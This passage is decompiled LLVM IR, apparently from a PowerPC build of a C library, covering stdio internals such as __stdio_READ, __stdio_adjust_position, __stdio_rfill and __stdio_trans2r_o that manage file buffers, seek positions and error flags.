  store i32 %v2_100096ac, i32* @r29, align 4
  %v2_100096b4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100096b4, i32* @r3, align 4
  %v0_100096c0 = call i32 @__pthread_return_void()
  %v0_100096c8 = call i32 @__pthread_return_0()
  %v0_100096cc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100096cc

dec_label_pc_100096cc:                            ; preds = %dec_label_pc_100096a0, %dec_label_pc_100096ac
  %v0_100096d8 = phi i32 [ %tmp, %dec_label_pc_100096a0 ], [ %v0_100096cc.pre, %dec_label_pc_100096ac ]
  %v1_100096cc = inttoptr i32 %v0_100096d8 to i16*
  %v2_100096cc = load i16, i16* %v1_100096cc, align 2
  %v3_100096cc = zext i16 %v2_100096cc to i32
  store i32 %v3_100096cc, i32* %r0.global-to-local, align 4
  %v1_100096d0 = and i32 %v3_100096cc, 64
  store i32 %v1_100096d0, i32* %r9.global-to-local, align 4
  %v3_100096d0 = icmp eq i32 %v1_100096d0, 0
  br i1 %v3_100096d0, label %dec_label_pc_100096e8, label %dec_label_pc_100096d8

dec_label_pc_100096d8:                            ; preds = %dec_label_pc_100096cc
  store i32 %v0_100096d8, i32* @r3, align 4
  store i32 268474080, i32* @lr, align 4
  %v0_100096dc = call i32 @__stdio_wcommit()
  %v3_100096e0 = icmp eq i32 %v0_100096dc, 0
  br i1 %v3_100096e0, label %dec_label_pc_100096e8, label %dec_label_pc_10009750

dec_label_pc_100096e8:                            ; preds = %dec_label_pc_100096d8, %dec_label_pc_100096cc
  %v0_100096e8 = load i32, i32* @r30, align 4
  %v3_100096e8 = icmp eq i32 %v0_100096e8, 1
  br i1 %v3_100096e8, label %dec_label_pc_100096f0, label %dec_label_pc_100096e8.dec_label_pc_10009704_crit_edge

dec_label_pc_100096e8.dec_label_pc_10009704_crit_edge: ; preds = %dec_label_pc_100096e8
  br label %dec_label_pc_10009704

dec_label_pc_100096f0:                            ; preds = %dec_label_pc_100096e8
  %v0_100096f0 = load i32, i32* @r31, align 4
  %v1_100096f0 = inttoptr i32 %v0_100096f0 to i16*
  %v2_100096f4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268474108, i32* @lr, align 4
  %v4_100096f8 = call i32 @__stdio_adjust_position(i16* %v1_100096f0, i32 %v2_100096f4)
  %v1_100096fc = icmp slt i32 %v4_100096f8, 0
  br i1 %v1_100096fc, label %dec_label_pc_10009750, label %dec_label_pc_100096f0.dec_label_pc_10009704_crit_edge

dec_label_pc_100096f0.dec_label_pc_10009704_crit_edge: ; preds = %dec_label_pc_100096f0
  %v0_10009704.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009704

dec_label_pc_10009704:                            ; preds = %dec_label_pc_100096e8.dec_label_pc_10009704_crit_edge, %dec_label_pc_100096f0.dec_label_pc_10009704_crit_edge
  %v0_10009704 = phi i32 [ %v0_100096e8, %dec_label_pc_100096e8.dec_label_pc_10009704_crit_edge ], [ %v0_10009704.pre, %dec_label_pc_100096f0.dec_label_pc_10009704_crit_edge ]
  %v0_10009708 = load i32, i32* @r31, align 4
  store i32 268474132, i32* @lr, align 4
  %v5_10009710 = call i32 @__stdio_seek(i32 %v0_10009708, i32* nonnull %stack_var_-56, i32 %v0_10009704)
  %v1_10009714 = icmp slt i32 %v5_10009710, 0
  br i1 %v1_10009714, label %dec_label_pc_10009750, label %dec_label_pc_1000971c

dec_label_pc_1000971c:                            ; preds = %dec_label_pc_10009704
  %v0_1000971c = load i32, i32* @r31, align 4
  %v1_1000971c = inttoptr i32 %v0_1000971c to i16*
  %v2_1000971c = load i16, i16* %v1_1000971c, align 2
  %v3_1000971c = zext i16 %v2_1000971c to i32
  store i32 %v3_1000971c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10009724 = add i32 %v0_1000971c, 8
  %v2_10009724 = inttoptr i32 %v1_10009724 to i32*
  %v3_10009724 = load i32, i32* %v2_10009724, align 4
  store i32 %v3_10009724, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000972c = and i32 %v3_1000971c, 65464
  store i32 %v1_1000972c, i32* %r0.global-to-local, align 4
  %v3_10009730 = add i32 %v0_1000971c, 2
  %v4_10009730 = inttoptr i32 %v3_10009730 to i8*
  store i8 0, i8* %v4_10009730, align 1
  %v0_10009734 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009734 = load i32, i32* @r31, align 4
  %v2_10009734 = add i32 %v1_10009734, 28
  %v3_10009734 = inttoptr i32 %v2_10009734 to i32*
  store i32 %v0_10009734, i32* %v3_10009734, align 4
  %v0_10009738 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009738 = trunc i32 %v0_10009738 to i16
  %v2_10009738 = load i32, i32* @r31, align 4
  %v3_10009738 = inttoptr i32 %v2_10009738 to i16*
  store i16 %v1_10009738, i16* %v3_10009738, align 2
  %v0_1000973c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000973c = load i32, i32* @r31, align 4
  %v2_1000973c = add i32 %v1_1000973c, 16
  %v3_1000973c = inttoptr i32 %v2_1000973c to i32*
  store i32 %v0_1000973c, i32* %v3_1000973c, align 4
  %v0_10009740 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009740 = load i32, i32* @r31, align 4
  %v2_10009740 = add i32 %v1_10009740, 20
  %v3_10009740 = inttoptr i32 %v2_10009740 to i32*
  store i32 %v0_10009740, i32* %v3_10009740, align 4
  %v0_10009744 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009744 = load i32, i32* @r31, align 4
  %v2_10009744 = add i32 %v1_10009744, 24
  %v3_10009744 = inttoptr i32 %v2_10009744 to i32*
  store i32 %v0_10009744, i32* %v3_10009744, align 4
  %v0_10009748 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009748 = load i32, i32* @r31, align 4
  %v2_10009748 = add i32 %v1_10009748, 44
  %v3_10009748 = inttoptr i32 %v2_10009748 to i32*
  store i32 %v0_10009748, i32* %v3_10009748, align 4
  br label %dec_label_pc_10009754

dec_label_pc_10009750:                            ; preds = %dec_label_pc_100096d8, %dec_label_pc_10009704, %dec_label_pc_100096f0
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_10009754

dec_label_pc_10009754:                            ; preds = %dec_label_pc_1000971c, %dec_label_pc_10009750
  %v0_10009754 = load i32, i32* @r28, align 4
  %v3_10009754 = icmp eq i32 %v0_10009754, 0
  br i1 %v3_10009754, label %dec_label_pc_1000975c, label %dec_label_pc_10009768

dec_label_pc_1000975c:                            ; preds = %dec_label_pc_10009754
  %v2_1000975c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000975c, i32* @r3, align 4
  %v0_10009764 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10009768

dec_label_pc_10009768:                            ; preds = %dec_label_pc_10009754, %dec_label_pc_1000968c, %dec_label_pc_1000975c
  store i32 %v0_10009668, i32* %r0.global-to-local, align 4
  %v0_1000976c = load i32, i32* @r30, align 4
  ret i32 %v0_1000976c

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 8, 4, 3, 2, 26, 25, 24, 23, 22, 21, 0, 42, 44, 43, 35, 41, 40, 39, 38, 14, 13, 12, 11, 10, 20, 19, 18, 17, 16, 15, 9, 32, 31, 30, 34, 33, 37, 29, 36, 1, 28, 27, 7, 6, 5 }
  uselistorder i32 ()* @__pthread_return_void, { 10, 9, 8, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0, 47, 46, 51, 50, 49, 48, 41, 40, 12, 11, 35, 34, 33, 32, 31, 30, 39, 38, 37, 36, 45, 44, 29, 28, 43, 42, 27, 26, 25, 24, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 56, { 2, 4, 3, 0, 1 }
  uselistorder i32 52, { 5, 6, 8, 0, 3, 1, 7, 4, 2 }
  uselistorder i32 22, { 0, 13, 1, 2, 9, 3, 10, 12, 4, 15, 5, 14, 6, 7, 11, 8 }
  uselistorder label %dec_label_pc_10009768, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009754, { 1, 0 }
  uselistorder label %dec_label_pc_10009750, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009704, { 1, 0 }
  uselistorder label %dec_label_pc_100096cc, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000978c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10009798 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100097a0 = and i16 %v3_10009798, 4
  %v3_100097a0 = icmp eq i16 %v1_100097a0, 0
  br i1 %v3_100097a0, label %dec_label_pc_100097a8, label %dec_label_pc_100097e0

dec_label_pc_100097a8:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_100097b4, label %dec_label_pc_100097ac

dec_label_pc_100097ac:                            ; preds = %dec_label_pc_100097a8
  br label %dec_label_pc_100097b4

dec_label_pc_100097b4:                            ; preds = %dec_label_pc_100097a8, %dec_label_pc_100097ac
  %v1_100097b4 = add i32 %tmp, 4
  %v2_100097b4 = inttoptr i32 %v1_100097b4 to i32*
  %v3_100097b4 = load i32, i32* %v2_100097b4, align 4
  store i32 %v3_100097b4, i32* %r3.global-to-local, align 4
  store i32 268474300, i32* @lr, align 4
  %v1_100097b8 = call i32 @__libc_read(i32 %v3_100097b4)
  store i32 %v1_100097b8, i32* %r3.global-to-local, align 4
  %v2_100097bc = icmp sgt i32 %v1_100097b8, 0
  br i1 %v2_100097bc, label %dec_label_pc_100097e0, label %dec_label_pc_100097c4

dec_label_pc_100097c4:                            ; preds = %dec_label_pc_100097b4
  %v3_100097bc = icmp eq i32 %v1_100097b8, 0
  %v0_100097c4 = load i32, i32* @r31, align 4
  %v1_100097c4 = inttoptr i32 %v0_100097c4 to i16*
  %v2_100097c4 = load i16, i16* %v1_100097c4, align 2
  br i1 %v3_100097bc, label %dec_label_pc_100097cc, label %dec_label_pc_100097d4

dec_label_pc_100097cc:                            ; preds = %dec_label_pc_100097c4
  %v1_100097cc = or i16 %v2_100097c4, 4
  br label %dec_label_pc_100097dc

dec_label_pc_100097d4:                            ; preds = %dec_label_pc_100097c4
  %v1_100097d4 = or i16 %v2_100097c4, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100097dc

dec_label_pc_100097dc:                            ; preds = %dec_label_pc_100097cc, %dec_label_pc_100097d4
  %v1_100097cc.sink.off0 = phi i16 [ %v1_100097cc, %dec_label_pc_100097cc ], [ %v1_100097d4, %dec_label_pc_100097d4 ]
  store i16 %v1_100097cc.sink.off0, i16* %v1_100097c4, align 2
  %v0_100097f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100097e0

dec_label_pc_100097e0:                            ; preds = %entry, %dec_label_pc_100097b4, %dec_label_pc_100097dc
  %v0_100097f0 = phi i32 [ 0, %entry ], [ %v1_100097b8, %dec_label_pc_100097b4 ], [ %v0_100097f0.pre, %dec_label_pc_100097dc ]
  store i32 %v0_1000978c, i32* @r31, align 4
  ret i32 %v0_100097f0

; uselistorder directives
  uselistorder i16 %v2_100097c4, { 1, 0 }
  uselistorder i32 %v1_100097b8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_100097e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100097dc, { 1, 0 }
  uselistorder label %dec_label_pc_100097b4, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000980c = load i16, i16* %arg1, align 2
  %v4_1000980c = zext i16 %v3_1000980c to i32
  %tmp9 = urem i16 %v3_1000980c, 4
  %v3_10009810 = icmp eq i16 %tmp9, 0
  br i1 %v3_10009810, label %dec_label_pc_1000985c, label %dec_label_pc_10009818

dec_label_pc_10009818:                            ; preds = %entry
  %v1_10009810 = zext i16 %tmp9 to i32
  %v1_10009818 = add nsw i32 %v1_10009810, -1
  store i32 %v1_10009818, i32* %r10.global-to-local, align 4
  %v4_10009818 = icmp eq i32 %v1_10009818, 0
  br i1 %v4_10009818, label %dec_label_pc_1000985c, label %dec_label_pc_10009820

dec_label_pc_10009820:                            ; preds = %dec_label_pc_10009818
  %v1_10009820 = and i32 %v4_1000980c, 2048
  %v3_10009820 = icmp eq i32 %v1_10009820, 0
  br i1 %v3_10009820, label %dec_label_pc_1000985c, label %dec_label_pc_10009828

dec_label_pc_10009828:                            ; preds = %dec_label_pc_10009820
  %v2_10009828 = icmp sgt i32 %v1_10009818, 1
  br i1 %v2_10009828, label %dec_label_pc_100098d4, label %dec_label_pc_10009830

dec_label_pc_10009830:                            ; preds = %dec_label_pc_10009828
  %v2_10009830 = add i32 %tmp, 40
  %v3_10009830 = inttoptr i32 %v2_10009830 to i32*
  %v4_10009830 = load i32, i32* %v3_10009830, align 4
  %v3_10009834 = icmp eq i32 %v4_10009830, 0
  br i1 %v3_10009834, label %dec_label_pc_1000983c, label %dec_label_pc_100098d4

dec_label_pc_1000983c:                            ; preds = %dec_label_pc_10009830
  %v2_1000983c = add i32 %tmp, 44
  %v3_1000983c = inttoptr i32 %v2_1000983c to i32*
  %v4_1000983c = load i32, i32* %v3_1000983c, align 4
  %v2_10009840 = add i32 %tmp, 3
  %v3_10009840 = inttoptr i32 %v2_10009840 to i8*
  %v4_10009840 = load i8, i8* %v3_10009840, align 1
  %v5_10009840 = zext i8 %v4_10009840 to i32
  %v2_10009848 = sub nsw i32 %v1_10009818, %v5_10009840
  %v1_1000984c = add nsw i32 %v2_10009848, -1
  store i32 %v1_1000984c, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000983c, 1
  br i1 %tmp7, label %dec_label_pc_1000985c, label %dec_label_pc_10009854

dec_label_pc_10009854:                            ; preds = %dec_label_pc_1000983c
  %v2_10009854 = add i32 %tmp, 2
  %v3_10009854 = inttoptr i32 %v2_10009854 to i8*
  %v4_10009854 = load i8, i8* %v3_10009854, align 1
  %v5_10009854 = zext i8 %v4_10009854 to i32
  %v2_10009858 = sub nsw i32 %v1_1000984c, %v5_10009854
  store i32 %v2_10009858, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000985c

dec_label_pc_1000985c:                            ; preds = %dec_label_pc_1000983c, %dec_label_pc_10009820, %dec_label_pc_10009818, %entry, %dec_label_pc_10009854
  %v0_10009880 = phi i32 [ %v1_1000984c, %dec_label_pc_1000983c ], [ %v1_10009818, %dec_label_pc_10009820 ], [ 0, %dec_label_pc_10009818 ], [ 0, %entry ], [ %v2_10009858, %dec_label_pc_10009854 ]
  %v1_1000985c = and i32 %v4_1000980c, 64
  %v3_1000985c = icmp eq i32 %v1_1000985c, 0
  %storemerge.in.in.v = select i1 %v3_1000985c, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10009870 = add i32 %tmp, 16
  %v3_10009870 = inttoptr i32 %v2_10009870 to i32*
  %v4_10009870 = load i32, i32* %v3_10009870, align 4
  %v1_10009874 = inttoptr i32 %arg2 to i32*
  %v2_10009874 = load i32, i32* %v1_10009874, align 4
  store i32 %v2_10009874, i32* %r4.global-to-local, align 4
  %v2_10009878 = sub i32 %storemerge, %v4_10009870
  %v1_1000987c = add i32 %arg2, 4
  %v2_1000987c = inttoptr i32 %v1_1000987c to i32*
  %v3_1000987c = load i32, i32* %v2_1000987c, align 4
  store i32 %v3_1000987c, i32* %r5.global-to-local, align 4
  %v2_10009880 = add i32 %v2_10009878, %v0_10009880
  store i32 %v2_10009880, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10009880, 0
  %v1_10009888 = zext i1 %tmp10 to i32
  %v2_10009888 = ashr i32 %v2_10009880, 31
  %v3_10009888 = and i32 %v2_10009888, -2
  %v4_10009888 = or i32 %v3_10009888, %v1_10009888
  %v2_1000988c = sub i32 %v3_1000987c, %v2_10009880
  %v3_1000988c = sub i32 -1, %v2_10009880
  store i32 %v2_1000988c, i32* %r10.global-to-local, align 4
  %v6_1000988c = icmp ule i32 %v2_1000988c, %v3_1000988c
  %v2_10009890 = sub nsw i32 -1, %v4_10009888
  %v3_10009890 = add i32 %v2_10009874, %v2_10009890
  %v5_10009890 = zext i1 %v6_1000988c to i32
  %v6_10009890 = add i32 %v3_10009890, %v5_10009890
  store i32 %v6_10009890, i32* %v1_10009874, align 4
  %v0_10009898 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009898 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009898 = add i32 %v1_10009898, 4
  %v3_10009898 = inttoptr i32 %v2_10009898 to i32*
  store i32 %v0_10009898, i32* %v3_10009898, align 4
  %v0_1000989c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000989c = inttoptr i32 %v0_1000989c to i32*
  %v2_1000989c = load i32, i32* %v1_1000989c, align 4
  %v1_100098a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_100098a0 = icmp sgt i32 %v2_1000989c, %v1_100098a0
  br i1 %v3_100098a0, label %dec_label_pc_100098b8, label %dec_label_pc_100098a8

dec_label_pc_100098a8:                            ; preds = %dec_label_pc_1000985c
  %v4_100098a0 = icmp eq i32 %v2_1000989c, %v1_100098a0
  br i1 %v4_100098a0, label %dec_label_pc_100098ac, label %dec_label_pc_100098bcthread-pre-split

dec_label_pc_100098ac:                            ; preds = %dec_label_pc_100098a8
  %v1_100098ac = add i32 %v0_1000989c, 4
  %v2_100098ac = inttoptr i32 %v1_100098ac to i32*
  %v3_100098ac = load i32, i32* %v2_100098ac, align 4
  %v1_100098b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_100098b0 = icmp ugt i32 %v3_100098ac, %v1_100098b0
  br i1 %v3_100098b0, label %dec_label_pc_100098b8, label %dec_label_pc_100098bcthread-pre-split

dec_label_pc_100098b8:                            ; preds = %dec_label_pc_100098ac, %dec_label_pc_1000985c
  %v0_100098b8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100098b8 = sub i32 0, %v0_100098b8
  store i32 %v1_100098b8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098bc

dec_label_pc_100098bcthread-pre-split:            ; preds = %dec_label_pc_100098a8, %dec_label_pc_100098ac
  %v0_100098bc.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098bc

dec_label_pc_100098bc:                            ; preds = %dec_label_pc_100098bcthread-pre-split, %dec_label_pc_100098b8
  %v0_100098bc = phi i32 [ %v0_100098bc.pr, %dec_label_pc_100098bcthread-pre-split ], [ %v1_100098b8, %dec_label_pc_100098b8 ]
  %tmp8 = icmp sgt i32 %v0_100098bc, -1
  br i1 %tmp8, label %dec_label_pc_100098d8, label %dec_label_pc_100098c4

dec_label_pc_100098c4:                            ; preds = %dec_label_pc_100098bc
  %v0_100098c4 = call i32 @__errno_location()
  %v2_100098cc = inttoptr i32 %v0_100098c4 to i32*
  store i32 75, i32* %v2_100098cc, align 4
  %v0_100098dc.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098d8

dec_label_pc_100098d4:                            ; preds = %dec_label_pc_10009830, %dec_label_pc_10009828
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098d8

dec_label_pc_100098d8:                            ; preds = %dec_label_pc_100098bc, %dec_label_pc_100098c4, %dec_label_pc_100098d4
  %v0_100098dc = phi i32 [ %v0_100098bc, %dec_label_pc_100098bc ], [ %v0_100098dc.pre, %dec_label_pc_100098c4 ], [ -1, %dec_label_pc_100098d4 ]
  ret i32 %v0_100098dc

; uselistorder directives
  uselistorder i32 %v2_1000989c, { 1, 0 }
  uselistorder i32 %v2_10009880, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100098d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100098bcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000985c, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_100098f0 = load i32, i32* @lr, align 4
  store i32 %v0_100098f0, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10009904 = add i32 %arg1, 8
  %v2_10009904 = inttoptr i32 %v1_10009904 to i32*
  %v3_10009904 = load i32, i32* %v2_10009904, align 4
  %v1_10009908 = add i32 %arg1, 12
  %v2_10009908 = inttoptr i32 %v1_10009908 to i32*
  %v3_10009908 = load i32, i32* %v2_10009908, align 4
  %v2_1000990c = sub i32 %v3_10009908, %v3_10009904
  store i32 268474644, i32* @lr, align 4
  %v3_10009910 = inttoptr i32 %v3_10009904 to i16*
  %v4_10009910 = call i32 @__stdio_READ(i16* %v3_10009910, i32 %v2_1000990c, i32 %v2_1000990c)
  %v0_10009914 = load i32, i32* @r29, align 4
  %v1_10009914 = add i32 %v0_10009914, 8
  %v2_10009914 = inttoptr i32 %v1_10009914 to i32*
  %v3_10009914 = load i32, i32* %v2_10009914, align 4
  %v2_10009918 = add i32 %v3_10009914, %v4_10009910
  store i32 %v2_10009918, i32* %r0.global-to-local, align 4
  %v2_1000991c = add i32 %v0_10009914, 16
  %v3_1000991c = inttoptr i32 %v2_1000991c to i32*
  store i32 %v3_10009914, i32* %v3_1000991c, align 4
  %v0_10009920 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009920 = load i32, i32* @r29, align 4
  %v2_10009920 = add i32 %v1_10009920, 20
  %v3_10009920 = inttoptr i32 %v2_10009920 to i32*
  store i32 %v0_10009920, i32* %v3_10009920, align 4
  store i32 %v0_100098f0, i32* %r0.global-to-local, align 4
  ret i32 %v4_10009910

; uselistorder directives
  uselistorder i32 %v3_10009914, { 1, 0 }
  uselistorder i32 %v4_10009910, { 1, 0 }
  uselistorder i32 %v3_10009904, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10009940 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000994c = load i16, i16* %arg1, align 2
  %v4_1000994c = zext i16 %v3_1000994c to i32
  %v2_10009950 = and i32 %v4_1000994c, %arg2
  %v5_10009950 = icmp eq i32 %v2_10009950, 0
  br i1 %v5_10009950, label %dec_label_pc_10009958, label %dec_label_pc_10009968

dec_label_pc_10009958:                            ; preds = %entry
  %v1_10009958 = and i32 %v4_1000994c, 2176
  %v3_10009958 = icmp eq i32 %v1_10009958, 0
  br i1 %v3_10009958, label %dec_label_pc_10009960, label %dec_label_pc_10009974

dec_label_pc_10009960:                            ; preds = %dec_label_pc_10009958
  %v2_10009960 = or i32 %v4_1000994c, %arg2
  %v1_10009964 = trunc i32 %v2_10009960 to i16
  store i16 %v1_10009964, i16* %arg1, align 2
  %v0_10009968.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009968

dec_label_pc_10009968:                            ; preds = %entry, %dec_label_pc_10009960
  %v0_10009968 = phi i32 [ %tmp, %entry ], [ %v0_10009968.pre, %dec_label_pc_10009960 ]
  %v1_10009968 = inttoptr i32 %v0_10009968 to i16*
  %v2_10009968 = load i16, i16* %v1_10009968, align 2
  %v3_10009968 = zext i16 %v2_10009968 to i32
  %v1_1000996c = and i32 %v3_10009968, 16
  %v3_1000996c = icmp eq i32 %v1_1000996c, 0
  br i1 %v3_1000996c, label %dec_label_pc_10009990, label %dec_label_pc_10009974

dec_label_pc_10009974:                            ; preds = %dec_label_pc_10009958, %dec_label_pc_10009968
  %v0_10009974 = call i32 @__errno_location()
  store i32 %v0_10009974, i32* %r3.global-to-local, align 4
  %v2_1000997c = inttoptr i32 %v0_10009974 to i32*
  store i32 9, i32* %v2_1000997c, align 4
  br label %dec_label_pc_10009980

dec_label_pc_10009980:                            ; preds = %dec_label_pc_10009998, %dec_label_pc_10009974
  %v0_10009980 = load i32, i32* @r31, align 4
  %v1_10009980 = inttoptr i32 %v0_10009980 to i16*
  %v2_10009980 = load i16, i16* %v1_10009980, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009988 = or i16 %v2_10009980, 8
  br label %dec_label_pc_100099c4

dec_label_pc_10009990:                            ; preds = %dec_label_pc_10009968
  %v1_10009990 = and i32 %v3_10009968, 64
  %v3_10009990 = icmp eq i32 %v1_10009990, 0
  br i1 %v3_10009990, label %dec_label_pc_100099b8, label %dec_label_pc_10009998

dec_label_pc_10009998:                            ; preds = %dec_label_pc_10009990
  store i32 268474780, i32* @lr, align 4
  %v0_10009998 = call i32 @__stdio_wcommit()
  store i32 %v0_10009998, i32* %r3.global-to-local, align 4
  %v3_1000999c = icmp eq i32 %v0_10009998, 0
  br i1 %v3_1000999c, label %dec_label_pc_100099a4, label %dec_label_pc_10009980

dec_label_pc_100099a4:                            ; preds = %dec_label_pc_10009998
  %v0_100099a4 = load i32, i32* @r31, align 4
  %v1_100099a4 = inttoptr i32 %v0_100099a4 to i16*
  %v2_100099a4 = load i16, i16* %v1_100099a4, align 2
  %v3_100099a4 = zext i16 %v2_100099a4 to i32
  %v1_100099a8 = add i32 %v0_100099a4, 8
  %v2_100099a8 = inttoptr i32 %v1_100099a8 to i32*
  %v3_100099a8 = load i32, i32* %v2_100099a8, align 4
  %v1_100099ac = call i32 @__asm_rlwinm(i32 %v3_100099a4, i32 0, i32 26, i32 24)
  %v2_100099ac = trunc i32 %v1_100099ac to i16
  %v1_100099b0 = load i32, i32* @r31, align 4
  %v2_100099b0 = add i32 %v1_100099b0, 28
  %v3_100099b0 = inttoptr i32 %v2_100099b0 to i32*
  store i32 %v3_100099a8, i32* %v3_100099b0, align 4
  %v3_100099b4 = load i32, i32* @r31, align 4
  %v4_100099b4 = inttoptr i32 %v3_100099b4 to i16*
  store i16 %v2_100099ac, i16* %v4_100099b4, align 2
  %v0_100099b8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099b8

dec_label_pc_100099b8:                            ; preds = %dec_label_pc_10009990, %dec_label_pc_100099a4
  %v0_100099b8 = phi i32 [ %v0_10009968, %dec_label_pc_10009990 ], [ %v0_100099b8.pre, %dec_label_pc_100099a4 ]
  %v1_100099b8 = inttoptr i32 %v0_100099b8 to i16*
  %v2_100099b8 = load i16, i16* %v1_100099b8, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100099c0 = or i16 %v2_100099b8, 1
  br label %dec_label_pc_100099c4

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_10009980, %dec_label_pc_100099b8
  %v2_100099c4 = phi i32 [ %v0_10009980, %dec_label_pc_10009980 ], [ %v0_100099b8, %dec_label_pc_100099b8 ]
  %storemerge.off0 = phi i16 [ %v1_10009988, %dec_label_pc_10009980 ], [ %v1_100099c0, %dec_label_pc_100099b8 ]
  %v3_100099c4 = inttoptr i32 %v2_100099c4 to i16*
  store i16 %storemerge.off0, i16* %v3_100099c4, align 2
  store i32 %v0_10009940, i32* @r31, align 4
  %v0_100099d8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100099d8

; uselistorder directives
  uselistorder i32 %v4_1000994c, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 6, 3, 2, 1, 5, 4, 0 }
  uselistorder i32 64, { 0, 4, 5, 6, 7, 2, 3, 8, 1 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100099c4, { 1, 0 }
  uselistorder label %dec_label_pc_100099b8, { 1, 0 }
  uselistorder label %dec_label_pc_10009974, { 1, 0 }
  uselistorder label %dec_label_pc_10009968, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_100099dc = load i32, i32* @lr, align 4
  store i32 %v0_100099dc, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_100099e8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_100099f4 = add i32 %arg1, 4
